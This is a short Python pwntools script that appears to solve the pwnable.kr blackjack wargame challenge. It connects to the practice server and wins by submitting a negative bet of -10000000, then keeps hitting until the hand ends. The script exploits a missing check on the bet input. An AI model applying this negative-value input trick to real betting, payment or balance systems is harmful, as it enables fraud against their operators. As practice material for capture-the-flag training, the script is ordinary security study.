#!/usr/bin/python3
from pwn import *
import datetime

def binary_connect():
  p = remote('pwnable.kr', 9009)
  return p

def exploit():
  def make_bet():
    p.recvuntil(b"Enter Bet: $")
    p.send(b"-10000000\n")

  def get_cash():
    cash = p.recvline().strip().split(b" $")[1]
    print("Cash: " + cash.decode("utf-8"))
    return int(cash.decode("utf-8"))

  def get_total():
    p.recvuntil(b"Your Total is ")
    total = p.recvline().strip()
    print("Total: " + total.decode("utf-8"))
    return int(total.decode("utf-8"))

  def get_dealer():
    p.recvuntil(b"The Dealer Has a Total of ")
    dealer = p.recvline().strip() 
    print("Dealer: " + dealer.decode("utf-8"))
    return int(dealer.decode("utf-8"))

  def hit_or_stay(decision):
    p.recvuntil(b"Hit or S to Stay.\n")
    if decision == "hit":
      p.send(b"H\n")
    else: 
      p.send(b"S\n")

  def wait():
    t = datetime.datetime.utcnow()
    sleeptime = (t.second + t.microsecond/1000000.) % 1 + .2
    print("waiting " + str(sleeptime) + " seconds")
    time.sleep(sleeptime)

  def start_hand():
    p.recvline()
    get_cash()
    total = get_total()
    dealer = get_dealer()
    make_bet()
    while True:
      hit_or_stay("hit")
      my_total = get_total()
      dealer_total = get_dealer()
      if my_total >= 21 or dealer_total >= 21:
        break
      
    p.recvuntil(b"Please Enter Y for Yes or N for No\n")
    p.send(b'Y\n')

  # exploit starts here
  p = binary_connect()
  p.recvuntil(b"Y/N)\n")
  p.recv()
  p.send(b"Y")
  p.recvuntil(b"Choice: ")
  p.send(b"1\n")
  start_hand()
  print(p.recvline())

if __name__ == "__main__":
  # context.log_level="debug"
  exploit()